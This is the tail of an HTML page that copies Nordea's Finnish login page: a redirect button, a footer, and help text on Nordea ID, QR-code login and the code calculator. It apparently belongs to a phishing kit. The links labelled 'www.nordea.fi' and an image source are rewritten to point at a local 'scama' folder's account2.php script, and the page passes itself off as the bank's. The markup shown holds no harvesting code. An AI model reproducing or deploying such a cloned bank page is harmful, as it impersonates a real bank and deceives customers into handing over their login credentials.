                <div id="manual-redirect" data-view-id="manual-redirect" class="success-content">
                    <p>Almost there.
                        Just click the button below to continue.</p>
                    <button id="manual-redirect-btn">Continue</button>
                </div>

                <div class="content-loader centered" id="content-loader" tabindex="-1" role="dialog">
                    <div class="loader" aria-hidden="true">
                        <svg focusable="false" viewBox="0 0 48 48">
                            <path d="M24,2.4000000000000004A21.6,21.6 0 1 1 2.4000000000000004,24" fill="none" stroke-width="4.5px" stroke="#000"></path>
                        </svg>
                    </div>
                    <p class="loader-text">Loading...</p>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div>© Nordea 2025 <br>Tämä yhteys on suojattu</div>





    </footer>

    <div id="notification" class="notification centered" aria-modal="true">
        <div class="notification-container centered" id="notification-content">
            <div role="dialog" aria-labelledby="notification-content-title" aria-describedby="notification-content-message" data-notification-content="" data-notification-id="system-messages" class="notification-content">
                <img aria-hidden="true" class="lazy-image" data-savepage-currentsrc="#/assets/images/service-break-f426cda35f41e4c0b7c30c814b5eb2ee.svg" data-savepage-src="/assets/images/service-break-f426cda35f41e4c0b7c30c814b5eb2ee.svg" src="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php" alt="" data-src="/assets/images/service-break-f426cda35f41e4c0b7c30c814b5eb2ee.svg">
                <h1 id="system-messages-content-title"></h1>
                <p id="system-messages-content-message"></p>
                <button data-toggle-notification="" type="button" aria-label="Close the notification">OK</button>
            </div>
        </div>
        <div class="notification-backdrop" id="notification-backdrop"></div>
    </div>


    <aside id="sidebar" class="sidebar" role="complementary" tabindex="-1" aria-hidden="true">
        <button type="button" class="icon-button sidebar-toggler" aria-label="Close help">
            <svg focusable="false" viewBox="0 0 32 32">
                <line x1="4.5" y1="4.5" x2="27.5" y2="27.5" style="fill:none;stroke:#ffffff;stroke-linecap:round;stroke-linejoin:round"></line>
                <line x1="27.5" y1="4.5" x2="4.5" y2="27.5" style="fill:none;stroke:#ffffff;stroke-linecap:round;stroke-linejoin:round"></line>
            </svg>
        </button>
        <div class="sidebar-content-wrapper">
            <div class="sidebar-inner-wrapper">
                <div id="sidebar-methods">
                    <div class="method-wrapper current" data-id="mta">
                        <div class="sidebar-main-info">
                            <h1 class="title">Nordea ID app</h1>
                            <p>Nordea ID is a mobile app that you use to log in to Nordea services and confirm actions.
                                You can also identify yourself towards other service providers.</p>
                            <p class="help">
                                <strong>Read more about Nordea ID</strong><br>
                                <a rel="noopener" target="_blank" href="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php#/en/nordea-id">www.nordea.fi</a>
                            </p>
                            <div>
                                <h2>Login identifier</h2>
                                <p>The identifier helps you confirm the right login. Check that the identifier shown by
                                    the Nordea ID app matches the one on this page.</p>
                                <p>If the identifiers do not match, ignore the request – do not approve it.</p>
                            </div>
                            <h2>User ID</h2>
                            <p>The user ID issued to you by Nordea. It contains 5-13 characters, numbers only.</p>
                        </div>

                    </div>
                    <div class="method-wrapper" data-id="mta_qr">
                        <div class="sidebar-main-info">
                            <h1 class="title">Nordea ID app
                                QR code</h1>
                            <p>A QR code is a one-time code that allows you to log in without the need to enter your
                                user ID. The QR code is used together with the Nordea ID app.</p>
                            <ol class="left-flush-list">
                                <li>Click OK to generate the code.</li>
                                <li>Open the Nordea ID app on your phone or tablet.</li>
                                <li>Tap “Scan QR code” in the app. This will switch on the camera for scanning the QR
                                    code.</li>
                                <li>Focus the camera on the QR code. Make sure the entire code is visible within the
                                    camera view in the app.</li>
                                <li>Confirm your login with your PIN or biometric identification (face or fingerprint
                                    ID).</li>
                            </ol>
                        </div>
                        <div data-flow-info="poller" class="hidden">
                            <h1 class="title">Nordea ID app
                                QR code</h1>
                            <ol class="left-flush-list">
                                <li>Open the Nordea ID app on your phone or tablet.</li>
                                <li>Tap Scan QR code in the app. This will switch on the camera for scanning the QR
                                    code.</li>
                                <li>Focus the camera on the QR code. Make sure the entire code is visible within the
                                    camera view in the app.</li>
                                <li>Confirm your login with your PIN or biometric identification (face or fingerprint
                                    ID).</li>
                            </ol>
                        </div>

                    </div>
                    <div class="method-wrapper" data-id="mta_off">
                        <div class="sidebar-main-info">
                            <h1 class="title">Nordea ID app offline mode</h1>
                            <p>Nordea ID is a mobile app that you use to log in to Nordea services and confirm actions.
                                You can also identify yourself towards other service providers. Nordea ID can be used in
                                online and offline mode. If your device is not connected to a network, you can continue
                                to use Nordea ID by selecting Go offline.</p>
                            <h2>User ID</h2>
                            <p>The User ID (FI) contains 5-13 characters, numbers only.</p>
                            <h2>Response code</h2>

                            <p class="newline">Tap LOGIN in Nordea ID in offline mode and follow the instructions to get
                                the response code for login.</p>


                        </div>
                    </div>
                    <div class="method-wrapper" data-id="ccalc">
                        <div class="sidebar-main-info">
                            <h1 class="title">Code calculator</h1>
                            <p>Code calculator is an authentication solution that is used for logon and signing in
                                several of Nordea's private and corporate services. To use it you need a Code Calculator
                                and Code Calculator PIN.</p>
                            <p class="help">
                                <strong>Read more about Code calculator</strong><br>
                                <a rel="noopener" target="_blank" href="http://localhost/scama-ysn/Nodeoyje/f528764/Account/account2.php#/en/personal/our-services/online-mobile-services/code-calculator.html">www.nordea.fi</a>
                            </p>

                            <h2>User ID</h2>
                            <p>The User ID (FI) contains 5-13 characters, numbers only. Personal identity number (SE)
                                consists of 12 digits.</p>

                            <h2>Response code</h2>

                            <p class="newline">Press the LOGIN button on the code calculator and follow instructions to
                                get the response code for login.</p>


                        </div>
                    </div>


                </div>
                <div class="text-center">
                    <button type="button" class="inverted-button sidebar-toggler" aria-label="Close help"><span aria-hidden="true">Close</span></button>
                </div>
            </div>
        </div>
    </aside>


</body></html>